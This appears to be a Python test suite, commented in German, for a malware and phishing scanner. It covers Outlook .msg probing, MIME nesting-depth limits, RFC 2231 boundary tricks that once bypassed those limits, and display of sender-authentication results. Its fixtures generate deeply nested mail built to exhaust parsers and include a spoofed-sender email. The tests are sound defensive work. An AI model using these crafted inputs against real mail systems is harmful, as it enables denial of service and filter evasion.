    assert probe_outlook_msg(_build_msg_cfb([])) == (False, "")  # OLE ohne Tabelle
    assert probe_outlook_msg(b"kein OLE-Container") == (False, "")
    assert probe_outlook_msg(b"") == (False, "")


def test_probe_outlook_msg_reports_an_unreadable_container(monkeypatch):
    """Ein nicht lesbarer Container ist "unbewiesen", nicht "keine Nachricht".

    Regression: `is_outlook_msg` machte aus JEDER Ausnahme ein False und
    schwieg. Der Dispatcher entscheidet daran, ob die Anhaenge geprueft
    werden — ein RecursionError im olefile-Verzeichnisdurchlauf liess die
    Pruefung damit stillschweigend entfallen.

    Er ist aber auch keine BESTAETIGTE Nachricht: der Mail-Pfad bleibt zu und
    der Grund wird gemeldet. Die Anhaenge lassen sich ohnehin nicht holen,
    weil derselbe olefile-Durchlauf dort genauso scheitert.
    """
    import olefile

    from malaz.core.mail_view import probe_outlook_msg

    def boom(*_a, **_k):
        raise RecursionError("maximum recursion depth exceeded")

    monkeypatch.setattr(olefile, "OleFileIO", boom)
    is_mail, problem = probe_outlook_msg(b"\xd0\xcf\x11\xe0" + b"\x00" * 64)
    assert is_mail is False, "unlesbar ist nicht dasselbe wie bestaetigt"
    assert problem, "der Grund darf nicht verschwiegen werden"
    assert "Rekursion" in problem


def test_unreadable_container_reports_and_stays_out_of_green(monkeypatch):
    """Der Lesefehler muss sichtbar sein und darf nicht gruen ergeben."""
    from malaz.core import dispatcher as dispatcher_mod
    from malaz.core.dispatcher import Dispatcher

    data = _build_msg_cfb([("evil.exe", b"MZ" + b"\x00" * 80)],
                          properties={"__substg1.0_0037001F": "S"})
    tmp = tempfile.mkdtemp()
    path = Path(tmp) / "probe.msg"
    path.write_bytes(data)

    monkeypatch.setattr(
        dispatcher_mod, "probe_outlook_msg", lambda _d: (False, "Testfehler")
    )
    d = Dispatcher(av_scanner=WindowsDefenderScanner(enabled=False),
                   clam_scanner=ClamAVScanner(enabled=False))
    r = d.scan_path(path)
    ids = {i.rule_id for i in r.all_indicators()}
    assert "MAIL_CONTAINER_WARN" in ids, "der Lesefehler muss sichtbar sein"
    assert r.risk_level != RiskLevel.GREEN, "ungeprueft ist nicht sauber"
    assert not any(i.startswith("EMAIL_") for i in ids), (
        "ein unlesbarer Container darf keine falschen Mail-Befunde erzeugen"
    )


def test_unreadable_ole_in_rtf_is_not_called_a_mail(tmp_path):
    """Gegenprobe am echten Artefakt: eingebettetes Objekt mit defektem DIFAT.

    Ein RTF mit eingebettetem OLE-Objekt wurde vorher als Mail behandelt —
    EMAIL_PARSE_ERROR auf einem Nicht-Mail-Container. Gemessen an
    ``rtf_with_embedded_ole``.
    """
    import sys

    sys.path.insert(0, "scripts")
    import make_test_corpus_extended as corpus

    from malaz.analysis.clamav import ClamAVScanner
    from malaz.analysis.windows_av import WindowsDefenderScanner
    from malaz.core.dispatcher import Dispatcher

    path = tmp_path / "object.rtf"
    path.write_bytes(corpus.rtf_with_embedded_ole())
    d = Dispatcher(av_scanner=WindowsDefenderScanner(enabled=False),
                   clam_scanner=ClamAVScanner(enabled=False))
    r = d.scan_path(path)
    ids = {i.rule_id for i in r.all_indicators()}
    assert not any(i.startswith("EMAIL_") for i in ids), (
        f"ein RTF ist keine Mail: {sorted(i for i in ids if i.startswith('EMAIL_'))}"
    )


def test_doc_renamed_to_msg_gets_no_fake_mail_preview(tmp_path):
    """Gegenprobe: ein OLE ohne Nachrichten-Properties bleibt ohne Preview."""
    from malaz.analysis.clamav import ClamAVScanner
    from malaz.analysis.windows_av import WindowsDefenderScanner
    from malaz.core.dispatcher import Dispatcher

    fake = tmp_path / "getarnt.msg"
    fake.write_bytes(_build_msg_cfb([]))  # OLE, aber keine Property-Tabelle

    d = Dispatcher(
        av_scanner=WindowsDefenderScanner(enabled=False),
        clam_scanner=ClamAVScanner(enabled=False),
    )
    r = d.scan_path(fake)
    assert not r.mail_preview, "kein erfundener Mail-Preview fuer OLE ohne Tabelle"


def _nested_mail(depth: int, decl, name, sep: bytes = b"\r\n") -> bytes:
    """Eine .eml mit ``depth`` ECHT verschachtelten multipart-Schichten.

    Die Verschachtelung muss der Grammatik folgen: der Top-Header deklariert
    ``b0``, die Zeile ``--b0`` oeffnet den ersten Teil, und DESSEN
    ``Content-Type`` deklariert ``b1`` — den Boundary seines eigenen Bodys.
    Eine von ``--b<k>`` geoeffnete Schicht deklariert also ``b<k+1>``.

    Die ersten beiden Fassungen dieses Helfers deklarierten denselben Token,
    den sie delimitierten (``--b0`` … ``boundary=b0``). Das ist kein gueltiges
    MIME: gemessen lieferte der stdlib-Parser dafuer Tiefe **2** bei 50 wie bei
    400 Ebenen — die Tests liefen gruen, ohne je echte Verschachtelung zu
    erzeugen. Mit dieser Fassung liefert der Parser bei 400 Ebenen Tiefe 401,
    und der Schaetzer folgt ihm (est 257 = ueber dem Budget).
    """
    lines = [b"--b0", b"Content-Type: multipart/mixed; boundary=" + decl(1, name(1)), b""]
    for k in range(1, depth):
        lines += [
            b"--" + name(k),
            b"Content-Type: multipart/mixed; boundary=" + decl(k + 1, name(k + 1)),
            b"",
        ]
    lines += [b"text"]
    for k in range(depth - 1, 0, -1):
        lines += [b"--" + name(k) + b"--"]
    lines += [b"--b0--"]
    return (
        b"From: a@b" + sep + b"Subject: x" + sep + b"MIME-Version: 1.0" + sep
        + b"Content-Type: multipart/mixed; boundary=" + decl(0, name(0)) + sep + sep
        + sep.join(lines) + sep
    )


def test_declaration_spellings_cannot_hide_the_nesting():
    """Die Tiefenschaetzung darf nicht an der Schreibweise des boundary vorbeilaufen.

    Regression (Runde 7): ``_MIME_BOUNDARY_DECL`` kannte nur ``boundary=`` mit
    hoechstens 70 Byte Wert. Der stdlib-Parser akzeptiert mehr — RFC2231
    ``boundary*=``, laengere Namen, quoted Werte mit Semikolon, Namen die
    selbst auf ``--`` enden. Blieb der echte Token ausserhalb des
    Deklarations-Sets, verwarf die Zaehlung JEDE Delimiter-Zeile und lieferte
    0: gemessen 2048 Schichten in 8,00 s statt 0,11 s.
    """
    from malaz.core.email_extract import mime_depth_note

    shapes = [
        ("regulaer", lambda i: b"b%d" % i, lambda i, t: t),
        ("RFC2231 boundary*=", lambda i: b"B%03d" % i, lambda i, t: b"us-ascii'en'" + t),
        ("Name > 70 Byte", lambda i: b"L%03d" % i + b"x" * 76, lambda i, t: t),
        ("quoted mit Semikolon", lambda i: b"b;%03d" % i, lambda i, t: b'"' + t + b'"'),
        ("Name endet auf --", lambda i: b"d%03d" % i + b"--", lambda i, t: t),
    ]
    for label, name, decl in shapes:
        data = _nested_mail(300, decl, name)
        assert mime_depth_note(data) is not None, (
            f"{label}: 300 Schichten wurden nicht als zu tief erkannt"
        )


def test_plain_text_that_looks_like_structure_is_not_a_deep_mail():
    """Gegenrichtung: Fliesstext darf keine Ablehnung ausloesen.

    Regression (Runde 7): 1100 ``boundary=b0000``-Zeichenketten im Body
    fuellten das Deklarations-Set bis zum Deckel; danach zaehlte JEDER
    Delimiter, und die 1100 ``--b0000``-Textzeilen desselben Bodys wurden als
    Verschachtelung gelesen — geschaetzte Tiefe 257 bei einer echten Tiefe von
    1. Beide Einstiegspunkte lehnten eine harmlose Mail ab; an einer echten
    Korpus-Phishingmail fiel das Urteil dadurch von ROT 100 auf GELB 30.

    Deklarationen werden deshalb nur in Kopfbereichen gesucht, dort wo der
    Parser sie auch liest.
    """
    from malaz.core.email_extract import mime_depth_note

    body = b"\r\n".join([b"boundary=b%04d" % i for i in range(1100)])
    body += b"\r\n" + b"\r\n".join([b"--b%04d" % i for i in range(1100)])
    data = (
        b"From: a@b\r\nSubject: x\r\nMIME-Version: 1.0\r\n"
        b"Content-Type: multipart/mixed; boundary=b0\r\n\r\n"
        b"--b0\r\nContent-Type: text/plain\r\n\r\n" + body + b"\r\n--b0--\r\n"
    )
    assert mime_depth_note(data) is None, "harmloser Fliesstext wurde als zu tief abgelehnt"


def test_signature_separator_does_not_reopen_the_overshoot():
    """Der Signaturtrenner darf die Deklarations-Suche nicht in den Body kippen.

    Regression (Runde 8, am eigenen Runde-7-Fix): die erste Fassung suchte
    Deklarationen in „Kopfbereichen", und ein Kopfbereich begann nach jeder
    Zeile, die mit ``--`` anfing. Der Signaturtrenner ``-- `` (RFC 3676, in
    echter Mail allgegenwaertig) schaltete die Suche damit mitten im Body
    wieder ein, die ``boundary=``-Zeichenketten des zitierten Textes fuellten
    das Set bis zum Deckel, und dieselbe harmlose Mail wurde erneut mit
    geschaetzter Tiefe 257 abgelehnt.

    Die Suche haengt jetzt am Header-NAMEN (``Content-Type:``), nicht an einer
    Position — das braucht weder eine Zustandsmaschine noch eine Reihenfolge
    (die Teile stehen von innen nach aussen im Strom).
    """
    from malaz.core.email_extract import mime_depth_note

    text = b"\r\n".join([b"boundary=b%04d" % i for i in range(1100)])
    text += b"\r\n" + b"\r\n".join([b"--b%04d" % i for i in range(1100)])
    for label, body in (
        ("nackt", text),
        ("mit Signaturtrenner", b"Gruss\r\n-- \r\nMax\r\n" + text),
    ):
        data = (
            b"From: a@b\r\nSubject: x\r\nMIME-Version: 1.0\r\n"
            b"Content-Type: multipart/mixed; boundary=b0\r\n\r\n"
            b"--b0\r\nContent-Type: text/plain\r\n\r\n" + body + b"\r\n--b0--\r\n"
        )
        assert mime_depth_note(data) is None, (
            f"{label}: harmloser Fliesstext wurde als zu tief abgelehnt"
        )


def _parser_depth(msg) -> int:
    """Echte Multipart-Tiefe, iterativ gezaehlt."""
    stack = [(msg, 1)]
    best = 1
    while stack:
        part, level = stack.pop()
        best = max(best, level)
        if part.is_multipart():
            for sub in part.get_payload():
                stack.append((sub, level + 1))
    return best


def test_the_nesting_fixture_really_nests():
    """Selbstpruefung des Fixtures: sonst pruefen die Tests darunter nichts.

    Regression (Runde 11): zwei Fassungen von ``_nested_mail`` deklarierten den
    Token, den sie auch delimitierten. Der stdlib-Parser sah darin Tiefe **2** —
    bei 50 wie bei 400 Ebenen —, waehrend der Schaetzer 50 bzw. 257 meldete. Die
    Tests liefen gruen, ohne je echte Verschachtelung zu erzeugen. Diese Pruefung
    haelt fest, dass das Fixture dem Parser wirklich Tiefe gibt.
    """
    from email import policy
    from email.parser import BytesParser

    for depth in (3, 50):
        data = _nested_mail(depth, lambda i, t: t, lambda i: b"b%d" % i)
        seen = _parser_depth(BytesParser(policy=policy.default).parsebytes(data))
        assert seen >= depth, f"{depth} Ebenen gebaut, der Parser sieht nur {seen}"


def test_cr_only_line_endings_reach_the_same_verdict():
    """CR-only darf die Tiefengrenze nicht umgehen.

    Regression (Runde 11): der Wechsel von ``splitlines()`` auf einen lazily
    iterierten Strom (gegen die Speicher-Amplifikation) trennt zunaechst nur an
    ``\\n``. Ohne die zusaetzliche CR-Aufteilung waere eine CR-only-Mail fuer die
    Deklarationssuche EINE Zeile, ``declared`` bliebe leer, die Schaetzung
    meldete (0,0) — und der Parser liefe mit der vollen quadratischen Kurve.
    """
    from email import policy
    from email.parser import BytesParser

    from malaz.core.email_extract import mime_depth_note

    for label, sep in (("CRLF", b"\r\n"), ("LF", b"\n"), ("CR-only", b"\r")):
        data = _nested_mail(400, lambda i, t: t, lambda i: b"b%d" % i, sep=sep)
        seen = _parser_depth(BytesParser(policy=policy.default).parsebytes(data))
        assert seen >= 400, f"{label}: Fixture verschachtelt nicht ({seen})"
        assert mime_depth_note(data) is not None, (
            f"{label}: 400 echte Ebenen wurden nicht als zu tief erkannt"
        )


def _nested_mail_continued(depth: int, sep: bytes = b"\r\n") -> bytes:
    """Wie ``_nested_mail``, aber jede Boundary per RFC-2231-Fortsetzung.

    ``boundary*0="b"; boundary*1="7"`` ist fuer den stdlib-Parser EIN Token
    (``b7``); die Deklarationssuche der Budgets kannte nur ``boundary*=`` und
    sah deshalb NICHTS — 300 Schichten wurden ungeparst durchgelassen
    (Audit SEC-032). Die Segmente stehen auf derselben Content-Type-Zeile,
    weil genau dort der Parser sie zusammenzieht (gemessen).
    """
    def decl(k: int) -> bytes:
        token = b"b%d" % k
        half = max(1, len(token) // 2)
        return (
            b'*0="' + token[:half] + b'"; boundary*1="' + token[half:] + b'"'
        )

    lines = [
        b"--b0",
        b"Content-Type: multipart/mixed; boundary" + decl(1),
        b"",
    ]
    for k in range(1, depth):
        lines += [
            b"--b%d" % k,
            b"Content-Type: multipart/mixed; boundary" + decl(k + 1),
            b"",
        ]
    lines += [b"text"]
    for k in range(depth - 1, 0, -1):
        lines += [b"--b%d--" % k]
    lines += [b"--b0--"]
    return (
        b"From: a@b" + sep + b"Subject: x" + sep + b"MIME-Version: 1.0" + sep
        + b"Content-Type: multipart/mixed; boundary" + decl(0) + sep + sep
        + sep.join(lines) + sep
    )


def test_rfc2231_boundary_continuation_cannot_hide_the_depth():
    """SEC-032: ``boundary*0=``/``boundary*1=`` umging beide MIME-Budgets.

    Vorher: declared 0, shape (0,0), ``mime_depth_note`` None — der stdlib-
    Parser verschachtelte trotzdem 300 Ebenen.
    """
    from email import policy
    from email.parser import BytesParser

    from malaz.core.email_extract import mime_depth_note

    data = _nested_mail_continued(300)
    seen = _parser_depth(BytesParser(policy=policy.default).parsebytes(data))
    assert seen >= 300, f"Fixture verschachtelt nicht ({seen})"
    assert mime_depth_note(data) is not None, (
        "boundary*0/*1 umging die Tiefenprüfung"
    )

    # Gegenprobe: eine flache Fortsetzungs-Mail ist KEIN Angriff.
    assert mime_depth_note(_nested_mail_continued(3)) is None


def test_every_olefile_call_site_is_inside_the_headroom():
    """Die Zusicherung „alle olefile-Aufrufe sind angeschlossen" als Test.

    Ich habe sie zweimal falsch behauptet: erst „an beiden Stellen" (es waren
    drei, die vierte fehlte), dann „alle vier" (es sind fuenf Aufrufe, vier mit
    Kopfraum). Jedes Mal war der Bericht glaubwuerdiger als der Baum. Statt die
    Zahl zu wiederholen, prueft dieser Test die Struktur: jeder Aufruf von
    ``olefile.OleFileIO`` muss in einem ``walk_headroom``-Fenster liegen oder
    ausdruecklich als flacher Check ausgenommen sein.
    """
    import ast

    def _problems(tree: ast.AST, flat_checks: set[str]) -> list[str]:
        """Nur Aufrufe im RUMPF eines ``walk_headroom``-With zaehlen.

        Die fruehere Fassung akzeptierte jedes ``With`` mit ``walk_headroom``
        irgendwo in derselben Funktion — ein ``OleFileIO`` NACH dem With blieb
        damit gruen (Audit TEST-023). Jetzt wird die Abstammung des Aufrufs
        geprueft: er muss unter einem Body-Statement des richtigen With haengen.
        """
        parents: dict[int, ast.AST] = {}
        for parent in ast.walk(tree):
            for child in ast.iter_child_nodes(parent):
                parents[id(child)] = parent

        def contained(call: ast.Call) -> bool:
            child: ast.AST = call
            node = parents.get(id(child))
            while node is not None:
                if isinstance(node, ast.With):
                    headroom_at = next(
                        (
                            index
                            for index, item in enumerate(node.items)
                            if "walk_headroom" in ast.dump(item.context_expr)
                        ),
                        None,
                    )
                    if headroom_at is not None:
                        # Im Rumpf: der With ist aktiv.
                        if any(child is stmt for stmt in node.body):
                            return True
                        # In einem SPAETEREN with-Item: dessen Ausdruck wird
                        # erst ausgewertet, nachdem das walk_headroom-Item
                        # betreten wurde (``with walk_headroom(...), OleFileIO(...):``).
                        for index, item in enumerate(node.items):
                            if index > headroom_at and (
                                child is item or child is item.context_expr
                            ):
                                return True
                child = node
                node = parents.get(id(node))
            return False

        found: list[str] = []
        for func in ast.walk(tree):
            if not isinstance(func, (ast.FunctionDef, ast.AsyncFunctionDef)):
                continue
            if func.name in flat_checks:
                continue
            for node in ast.walk(func):
                if not isinstance(node, ast.Call):
                    continue
                is_olefile = (
                    isinstance(node.func, ast.Attribute)
                    and node.func.attr == "OleFileIO"
                ) or (
                    isinstance(node.func, ast.Name) and node.func.id == "OleFileIO"
                )
                if is_olefile and not contained(node):
                    found.append(func.name)
        return found

    # Beissprobe: der Aufruf AUSSERHALB des With muss auffallen, der darin
    # nicht — genau die Mutation, die der alte Test durchliess.
    outside = ast.parse(
        "def f(p):\n"
        "    with walk_headroom(None):\n"
        "        pass\n"
        "    return OleFileIO(p)\n"
    )
    inside = ast.parse(
        "def f(p):\n"
        "    with walk_headroom(None):\n"
        "        return OleFileIO(p)\n"
    )
    assert _problems(outside, set()) == ["f"], "Aufruf ausserhalb des With bleibt gruen"
    assert _problems(inside, set()) == [], "Aufruf IM With wurde faelschlich verurteilt"

    src_root = Path(__file__).resolve().parent.parent / "src" / "malaz"
    flat_checks = {"_xlm_applicable"}  # flacher exists()-Check, faellt sicher zurueck
    problems: list[str] = []
    for path in sorted(src_root.rglob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        problems.extend(
            f"{path.name}:{name}" for name in _problems(tree, flat_checks)
        )

    assert not problems, (
        "olefile-Aufrufe ohne Kopfraum: "
        + ", ".join(problems)
        + " — jeder Aufruf auf angreiferkontrollierten Bytes braucht ihn, sonst "
        "messen die Stufen unterhalb des Produktionszustands"
    )


def test_mail_security_reaches_the_result_and_the_list_column(tmp_path):
    """Das Absender-Urteil muss in der LISTE stehen, nicht nur im Klapptext.

    Der Nutzer liest die Ergebnisliste — bis hierher war die
    Authentifizierung nur nach einem Klick im Detailfeld zu sehen. Geprueft
    wird die Kette Pipeline -> ScanResult -> Spaltentext, also das, was im
    Fenster tatsaechlich ankommt.
    """
    from malaz.gui.main_window import _mail_security_summary, _mail_security_tooltip

    faelschung = tmp_path / "faelschung.eml"
    faelschung.write_bytes(
        b'From: "post@serioese-bank.tld" <boese@evil.tld>\r\n'
        b"To: opfer@firma.de\r\n"
        b"Subject: Rechnung\r\n"
        b"Message-ID: <a@b.de>\r\n"
        b"Authentication-Results: mx; spf=fail; dkim=none; dmarc=fail\r\n"
        b"\r\n"
        b"Bitte zahlen.\r\n"
    )
    echt = tmp_path / "echt.eml"
    echt.write_bytes(
        b"From: Firma <service@firma.de>\r\n"
        b"To: kunde@firma.de\r\n"
        b"Subject: Info\r\n"
        b"Message-ID: <c@d.de>\r\n"
        b"Authentication-Results: mx.firma.de; spf=pass; dkim=pass; dmarc=pass\r\n"
        b"\r\n"
        b"Text.\r\n"
    )
    keine_mail = tmp_path / "notiz.txt"
    keine_mail.write_bytes(b"Nur Text.\n")

    dispatcher = Dispatcher(
        av_scanner=WindowsDefenderScanner(enabled=False),
        clam_scanner=ClamAVScanner(enabled=False),
    )
    schlecht = dispatcher.scan_path(faelschung)
    gut = dispatcher.scan_path(echt)
    text = dispatcher.scan_path(keine_mail)

    # 1) Die Urteile kommen aus der Kopfzeile der Mail.
    assert schlecht.mail_security["spf"] == "fail"
    assert schlecht.mail_security["dmarc"] == "fail"
    assert gut.mail_security == {
        "spf": "pass",
        "dkim": "pass",
        "dmarc": "pass",
        "sender": "ok",
        "has_from": "1",
    }

    # 2) Der gefaelschte Anzeigename faellt in der Liste auf.
    assert schlecht.mail_security["sender"] == "mismatch"
    spalte = _mail_security_summary(schlecht)
    assert "SPF\u2717" in spalte and "DMARC\u2717" in spalte
    # Die Warnung steht VORNE: die Zelle bricht um, und im ersten Entwurf war
    # genau dieser Teil abgeschnitten und damit unsichtbar.
    assert spalte.startswith("\u26a0 Name \u2260 Adresse"), f"Warnung nicht zuerst: {spalte!r}"
    assert "Name \u2260 Adresse" not in _mail_security_summary(gut)

    # 3) Der Klapptext nennt dieselbe Feststellung - Liste und Vorschau duerfen
    #    nicht auseinanderlaufen (vorher waren es zwei Umsetzungen).
    assert "tatsaechlich gesendet" in schlecht.mail_preview
    assert "tatsaechlich gesendet" not in gut.mail_preview
    assert "weicht von der Absenderadresse ab" in _mail_security_tooltip(schlecht)

    # 4) Nicht-Mails bekommen keine Spalte voller Striche.
    assert text.mail_security == {}
    assert _mail_security_summary(text) == ""


def test_msg_mail_security_reports_whether_a_sender_exists(tmp_path):
    """BUG-053: ``bool(mail_security)`` ist bei jeder Mail True.

    Der .msg-Zweig setzt spf/dkim/dmarc/sender immer — das Panel las daraus
    "Absender vorhanden" und bewertete eine Mail OHNE From mit 70
    („teilweise stimmig") statt 0 („Kein Absender"). Der neue Key
    ``has_from`` traegt die Tatsache selbst; die Anzeige darf ihn nicht aus
    den Auth-Feldern ableiten.
    """
    d = Dispatcher(
        av_scanner=WindowsDefenderScanner(enabled=False),
        clam_scanner=ClamAVScanner(enabled=False),
    )
    mit = tmp_path / "mit.msg"
    mit.write_bytes(_build_msg_cfb([], properties=_MSG_PROPS))
    ohne_props = {
        name: value
        for name, value in _MSG_PROPS.items()
        if not name.startswith("__substg1.0_5D01")
    }
    ohne = tmp_path / "ohne.msg"
    ohne.write_bytes(_build_msg_cfb([], properties=ohne_props))

    assert d.scan_path(mit).mail_security["has_from"] == "1"
    assert d.scan_path(ohne).mail_security["has_from"] == "0"
